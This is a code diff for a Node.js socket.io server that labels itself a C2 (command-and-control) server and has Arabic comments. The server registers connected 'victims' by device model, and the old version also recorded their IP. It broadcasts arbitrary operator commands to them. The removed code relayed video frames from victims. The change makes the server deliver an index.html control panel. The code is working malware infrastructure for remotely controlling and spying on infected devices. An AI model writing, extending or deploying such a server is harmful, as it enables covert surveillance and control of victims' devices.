@@ -1,4 +1,5 @@
 const express = require('express');
+const path = require('path'); // مكتبة المسارات
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http, {
@@ -6,8 +7,9 @@ const io = require('socket.io')(http, {
     maxHttpBufferSize: 1e8 
 });
 
+// هذا السطر هو الحل: يرسل ملف index.html عندما تفتح الرابط
 app.get('/', (req, res) => {
-    res.status(200).send('C2 Server is Online and Secure 😈');
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 let victims = {};
@@ -15,23 +17,14 @@ let victims = {};
 io.on('connection', (socket) => {
     console.log('[!] اتصال جديد');
 
-    // إرسال قائمة الضحايا فور اتصال لوحة التحكم
-    socket.on('get_victims', () => {
-        Object.values(victims).forEach(v => socket.emit('new_victim_alert', v));
-    });
-
     socket.on('victim_online', (data) => {
-        victims[socket.id] = { id: socket.id, model: data.model, ip: socket.handshake.address };
-        console.log(`[+] ضحية جديدة: ${data.model}`);
+        victims[socket.id] = { id: socket.id, model: data.model };
+        console.log(`[+] ضحية متصلة: ${data.model}`);
         io.emit('new_victim_alert', victims[socket.id]);
     });
 
-    socket.on('admin_command', (payload) => {
-        socket.broadcast.emit(payload.command, payload);
-    });
-
-    socket.on('video_frame', (frame) => {
-        socket.broadcast.emit('display_frame', { frame: frame });
+    socket.on('admin_command', (data) => {
+        socket.broadcast.emit(data.command, data);
     });
 
     socket.on('disconnect', () => {
@@ -40,4 +33,6 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 8080;
-http.listen(PORT, '0.0.0.0', () => { console.log(`Server Live on ${PORT}`); });
+http.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is running on port ${PORT}`);
+});
